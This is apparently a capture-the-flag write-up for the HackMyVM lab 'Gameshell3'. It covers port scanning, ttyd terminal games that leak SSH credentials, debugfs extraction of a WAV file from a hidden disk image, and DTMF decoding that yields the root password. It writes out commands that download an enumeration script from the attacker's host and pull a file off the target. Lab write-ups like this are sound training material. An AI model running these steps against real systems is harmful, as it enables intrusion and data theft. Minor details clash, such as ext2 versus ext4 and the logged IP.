# Gameshell3

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Gameshell3 | Sublarge | Beginner | HackMyVM |

**Summary:** Gameshell3 is a beginner-level CTF machine that combines web-based gaming challenges with steganography and forensic analysis. The initial foothold is gained through a creative "Random Gate" web application on port 80 that hints at multiple ttyd terminal services running on ports 8001-8010. Each port hosts a Minesweeper game, but only one port (8004) contains a functional game that reveals SSH credentials upon completion. After gaining access as the `skr` user, privilege escalation involves discovering a hidden ext4 filesystem image in `/var/backups`, extracting an embedded WAV audio file containing DTMF (Dual-Tone Multi-Frequency) telephone tones, and decoding these tones using an online DTMF decoder to reveal the root password. The machine tests enumeration skills, problem-solving through gaming mechanics, filesystem forensics using debugfs, and audio steganography techniques.

---

## Reconnaissance

### Network Discovery

Initial network scanning identified the target machine in the VirtualBox environment:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.100 08:00:27:CB:FD:0D VirtualBox
```

The target machine was confirmed at IP address **192.168.100.100**.

### Port Scanning

A comprehensive Nmap scan was performed to identify all open ports and running services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gameshell3]
└─$ nmap -sC -sV -p- -T4 192.168.100.100
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-10 19:26 WIB
Nmap scan report for 192.168.100.100
Host is up (0.0026s latency).
Not shown: 65523 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Random Gate - Choose Your Door
|_http-server-header: Apache/2.4.62 (Debian)
8001/tcp open  http    ttyd 1.7.7-40e79c7 (libwebsockets 4.3.3-unknown)
|_http-server-header: ttyd/1.7.7-40e79c7 (libwebsockets/4.3.3-unknown)
|_http-title: Site doesn't have a title (text/html).
8002/tcp open  http    ttyd 1.7.7-40e79c7 (libwebsockets 4.3.3-unknown)
|_http-server-header: ttyd/1.7.7-40e79c7 (libwebsockets/4.3.3-unknown)
|_http-title: ttyd - Terminal
8003/tcp open  http    ttyd 1.7.7-40e79c7 (libwebsockets 4.3.3-unknown)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: ttyd/1.7.7-40e79c7 (libwebsockets/4.3.3-unknown)
8004/tcp open  http    ttyd 1.7.7-40e79c7 (libwebsockets 4.3.3-unknown)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: ttyd/1.7.7-40e79c7 (libwebsockets/4.3.3-unknown)
8005/tcp open  http    ttyd 1.7.7-40e79c7 (libwebsockets 4.3.3-unknown)
|_http-server-header: ttyd/1.7.7-40e79c7 (libwebsockets/4.3.3-unknown)
|_http-title: ttyd - Terminal
8006/tcp open  http    ttyd 1.7.7-40e79c7 (libwebsockets 4.3.3-unknown)
|_http-server-header: ttyd/1.7.7-40e79c7 (libwebsockets/4.3.3-unknown)
|_http-title: ttyd - Terminal
8007/tcp open  http    ttyd 1.7.7-40e79c7 (libwebsockets 4.3.3-unknown)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: ttyd/1.7.7-40e79c7 (libwebsockets/4.3.3-unknown)
8008/tcp open  http    ttyd 1.7.7-40e79c7 (libwebsockets 4.3.3-unknown)
|_http-server-header: ttyd/1.7.7-40e79c7 (libwebsockets/4.3.3-unknown)
|_http-title: ttyd - Terminal
8009/tcp open  http    ttyd 1.7.7-40e79c7 (libwebsockets 4.3.3-unknown)
|_ajp-methods: Failed to get a valid response for the OPTION request
|_http-server-header: ttyd/1.7.7-40e79c7 (libwebsockets/4.3.3-unknown)
|_http-title: Site doesn't have a title (text/html).
8010/tcp open  http    ttyd 1.7.7-40e79c7 (libwebsockets 4.3.3-unknown)
|_http-server-header: ttyd/1.7.7-40e79c7 (libwebsockets/4.3.3-unknown)
|_http-title: ttyd - Terminal
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.75 seconds
```

**Key Findings:**
- **Port 22 (SSH)**: OpenSSH 8.4p1 Debian - Standard SSH service
- **Port 80 (HTTP)**: Apache httpd 2.4.62 - Web server with title "Random Gate - Choose Your Door"
- **Ports 8001-8010 (HTTP)**: Multiple ttyd instances (version 1.7.7-40e79c7) - Terminal sharing services

The presence of 10 consecutive ttyd services (ports 8001-8010) immediately suggested these were intentionally exposed for the challenge.

---

## Initial Access

### Web Application Analysis - Port 80

Navigating to `http://192.168.100.100:80` revealed an interactive web application titled "Random Gate":

![Port 80 - Random Gate Application](image-2.png)

The webpage displayed 10 clickable doors numbered **8001 through 8010**, corresponding exactly to the ttyd services discovered during port scanning. The page's subtitle read: *"Click on a door to reveal your destiny!"*

**Source Code Analysis:**

Examining the page source revealed critical JavaScript code that generated the doors dynamically:

```javascript
generateDoors() {
    const container = document.getElementById('doorsContainer');
    container.innerHTML = '';
    
    for (let i = 8001; i <= 8010; i++) {
        const door = document.createElement('div');
        door.className = 'door';
        door.dataset.number = i;
        
        door.innerHTML = `
            <div class="door-number">${i}</div>
            <div class="door-handle"></div>
        `;
        
        container.appendChild(door);
        this.doors.push(door);
    }
}

selectWinningDoor() {
    const randomIndex = Math.floor(Math.random() * this.doors.length);
    this.winningDoor = this.doors[randomIndex];
}
```

The code confirmed that doors 8001-8010 were interactive elements, with one randomly selected as the "winning door." This was a clear hint to enumerate all ttyd services on these ports.

### Terminal Services Enumeration - Ports 8001-8010

Each port was manually inspected by navigating to `http://192.168.100.100:800X` where X ranged from 1 to 10.

**Port 8001 Example:**

![Port 8001 - Minesweeper Game (Not Playable)](image-3.png)

Port 8001 displayed a terminal-based Minesweeper game with the following interface:

However, this instance appeared frozen and did not respond to keyboard input.

**Enumeration Results:**
After testing all 10 ports, it was discovered that **only port 8004** hosted a functional, playable Minesweeper game. The other ports either displayed frozen game states or error messages.

### Credential Discovery - Port 8004

Port 8004 presented a fully interactive Minesweeper game at `http://192.168.100.100:8004`:

![Port 8004 - Winning the Minesweeper Game](image-5.png)

After successfully completing the Minesweeper puzzle (avoiding all mines), the game displayed a congratulatory message:


**Credentials Obtained:**
- **Username**: `skr`
- **Password**: `sk[REDACTED]`

This was the critical breakthrough - the game rewarded completion with valid SSH credentials.

### SSH Access

Using the discovered credentials, SSH access was attempted:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gameshell3]
└─$ ssh skr@192.168.100.100
...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
skr@192.168.100.100's password:
Linux GameShell3 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
...
skr@GameShell3:~$ id
uid=1000(skr) gid=1000(skr) groups=1000(skr)
skr@GameShell3:~$ ls -la
total 28
drwxr-xr-x 2 skr  skr  4096 Nov 21 09:52 .
drwxr-xr-x 3 root root 4096 Nov 21 04:54 ..
-rw------- 1 skr  skr    38 Nov 21 09:37 .bash_history
-rw-r--r-- 1 skr  skr   220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 skr  skr  3547 Nov 21 09:37 .bashrc
-rw-r--r-- 1 skr  skr   807 Apr 18  2019 .profile
-rw-r--r-- 1 root root   44 Nov 21 09:35 user.txt
skr@GameShell3:~$ timed out waiting for input: auto-logout
Connection to 192.168.100.100 closed.
```

**Issue Encountered:** The session automatically logged out with the message "timed out waiting for input: auto-logout". This indicated that the `TMOUT` environment variable was set, forcing logout after a period of inactivity.

**Resolution:** Upon reconnecting, the `TMOUT` variable was disabled to prevent automatic disconnection:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gameshell3]
└─$ ssh skr@192.168.100.100
...
skr@192.168.100.100's password:
Linux GameShell3 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
...
skr@GameShell3:~$ export TMOUT=0
```

With `TMOUT=0`, the session remained stable, allowing for proper enumeration.

---

## Privilege Escalation

### Automated Enumeration with LinPEAS

To identify privilege escalation vectors, LinPEAS (Linux Privilege Escalation Awesome Script) was transferred to the target:

**On Attacker Machine:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gameshell3]
└─$ cd ~/tools

┌──(ouba㉿CLIENT-DESKTOP)-[~/tools]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

**On Target Machine:**
```bash
skr@GameShell3:~$ wget http://192.168.100.1:8080/linpeas.sh
--2026-02-10 07:57:43--  http://192.168.100.1:8080/linpeas.sh
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 971926 (949K) [application/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh                   100%[==============================================>] 949.15K  --.-KB/s    in 0.05s

2026-02-10 07:57:43 (17.8 MB/s) - 'linpeas.sh' saved [971926/971926]
```

Succeed:

```bash
172.21.32.1 - - [10/Feb/2026 19:57:44] "GET /linpeas.sh HTTP/1.1" 200 -
```

Make it executable:

```bash
skr@GameShell3:~$ chmod +x linpeas.sh
```
### LinPEAS Execution and Findings

Running LinPEAS revealed an interesting anomaly in the backup directory:

```bash
skr@GameShell3:~$ ./linpeas.sh
...
╔══════════╣ Backup folders
drwxr-xr-x 2 root root 4096 Nov 21 08:59 /var/backups
total 984
...
-rw------- 1 root shadow       573 Nov 21 04:54 gshadow.bak
-rw-r--r-- 1 root root   104857600 Nov 21 04:54 hidden.img
-rw------- 1 root root        1383 Nov 21 04:54 passwd.bak
...
```

**Critical Discovery:** A file named `hidden.img` with a size of **104,857,600 bytes** (100 MB exactly) was found in `/var/backups`. This was highly suspicious:
- The file size is a perfect round number (100 MB), suggesting it's a disk image or filesystem container
- The filename "hidden.img" explicitly suggests concealed data
- The file was readable by all users, unlike the `.bak` files which were root-only

### Filesystem Forensics - Analyzing hidden.img

The `.img` extension and file size strongly indicated this was a disk/filesystem image. The `debugfs` tool was used to interact with the ext4 filesystem within the image:

```bash
skr@GameShell3:~$ file /var/backups/hidden.img
/var/backups/hidden.img: Linux rev 1.0 ext4 filesystem data, UUID=524fb1a5-e138-45e9-8868-30f7199bcfb4 (extents) (64bit) (large files) (huge files)
skr@GameShell3:~$ debugfs /var/backups/hidden.img
debugfs 1.44.5 (15-Dec-2018)
debugfs:  ls -l
```

![debugfs Output - Hidden Files](image-4.png)

**Output from debugfs:**

The `ls -l` command within debugfs revealed:
- **Inode 12**: A file named `secretmusic` with **27,245 bytes** and permissions `100755` (executable)
- The file was created on November 21, 2025 at 08:01

This hidden file was the target for extraction.

### Extracting the Hidden File

The `debugfs` utility provides a `dump` command to extract files from filesystem images without mounting them:

```bash
skr@GameShell3:~$ debugfs -R "dump /secretmusic /tmp/secretmusic" /var/backups/hidden.img
debugfs 1.44.5 (15-Dec-2018)
skr@GameShell3:~$ ls -la /tmp/secretmusic
-rw-r--r-- 1 skr skr 27245 Feb 10 09:38 /tmp/secretmusic
skr@GameShell3:~$ file /tmp/secretmusic
/tmp/secretmusic: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 8 bit, mono 8000 Hz
```

**Explanation:**
- `-R "dump /secretmusic /tmp/secretmusic"`: Executes the dump command to extract `/secretmusic` from the image to `/tmp/secretmusic`
- The file was successfully extracted with the correct size (27,245 bytes)
- Its an Audio file.

### File Transfer to Attacker Machine

To analyze the `secretmusic` file, it was transferred to the attacker's machine:

**On Target (Starting HTTP Server):**
```bash
skr@GameShell3:~$ cd /tmp
skr@GameShell3:/tmp$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

**On Attacker (Downloading File):**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/tools]
└─$ cd /tmp/gameshell3

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gameshell3]
└─$ curl http://192.168.100.100:8080/secretmusic -o secretmusic.wav
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 27245 100 27245   0     0  1099k     0  --:--:-- --:--:-- --:--:--  1108k
```

The file was saved as `secretmusic.wav` based on the expected audio content.

### Audio Analysis - DTMF Tone Detection

Playing the audio file revealed it contained telephone keypad tones:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gameshell3]
└─$ open secretmusic.wav
```

The audio consisted of **DTMF (Dual-Tone Multi-Frequency)** signals - the sounds produced when pressing buttons on a telephone keypad. Each tone represents a specific digit (0-9) or symbol (* or #).

**Initial Steghide Attempt:**
Suspecting the audio might contain steganographic data, steghide was tested:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gameshell3]
└─$ steghide extract -sf secretmusic.wav                                                             
Enter passphrase:
steghide: could not extract any data with that passphrase!
```

Steghide failed because WAV files don't support steghide's steganography method - it requires a passphrase, and the DTMF tones themselves were the data, not a container for hidden data.

### DTMF Decoding

Research into DTMF analysis led to the discovery of online DTMF decoders. The audio file was uploaded to https://dtmf.netlify.app/ :

![DTMF Decoder Output](image.png)

The decoded string began with `*#*#6` followed by additional characters (redacted for security). This pattern strongly suggested a password or access code.

### Root Access

Initially assuming the decoded DTMF output might be a steghide passphrase, it was tested. When that failed, the logical next step was to attempt using it as the root password:

```bash
skr@GameShell3:/tmp$ su - root
Password:
root@GameShell3:~# id ; whoami ; hostname
uid=0(root) gid=0(root) groups=0(root)
root
GameShell3
root@GameShell3:~# cat /home/skr/user.txt /root/root.txt
flag{user-a2a[REDACTED]}
flag{root-f0c[REDACTED]}
```

**Success!** The DTMF-decoded string was indeed the root password, both flags were retrieved.

---

## Attack Chain Summary

1. **Reconnaissance**: Performed network discovery to identify target at 192.168.100.100, followed by comprehensive Nmap scan revealing SSH (port 22), HTTP (port 80), and 10 ttyd terminal services (ports 8001-8010).

2. **Web Application Analysis**: Analyzed the "Random Gate" application on port 80, which displayed 10 clickable doors numbered 8001-8010. JavaScript source code indicated one door would be the "winning door," hinting at enumeration of all ttyd services.

3. **Service Enumeration**: Systematically tested all 10 ttyd services (ports 8001-8010), discovering that only port 8004 hosted a functional Minesweeper game while others were frozen or non-interactive.

4. **Credential Harvesting**: Successfully completed the Minesweeper game on port 8004, which rewarded the win with SSH credentials - username `skr` and password visible in the completion message.

5. **Initial Foothold**: Authenticated via SSH as user `skr`, encountered automatic logout due to TMOUT environment variable, and resolved by setting `TMOUT=0` to maintain persistent session.

6. **Privilege Enumeration**: Transferred and executed LinPEAS enumeration script, which identified an anomalous 100 MB file named `hidden.img` in `/var/backups` with world-readable permissions.

7. **Filesystem Forensics**: Used `debugfs` to analyze the ext2 filesystem image, discovering a hidden file named `secretmusic` (27,245 bytes) stored within the image.

8. **Data Extraction**: Extracted the `secretmusic` file from the filesystem image using `debugfs -R "dump"` command and transferred it to the attacker machine via Python HTTP server.

9. **Audio Steganography**: Analyzed the extracted WAV audio file containing DTMF (telephone keypad) tones, uploaded it to an online DTMF decoder (https://dtmf.netlify.app/), and successfully decoded the tone sequence to reveal a string beginning with `*#*#6`.

10. **Privilege Escalation**: Used the DTMF-decoded string as the root password via `su - root`, successfully escalating to root privileges and retrieving both user and root flags.

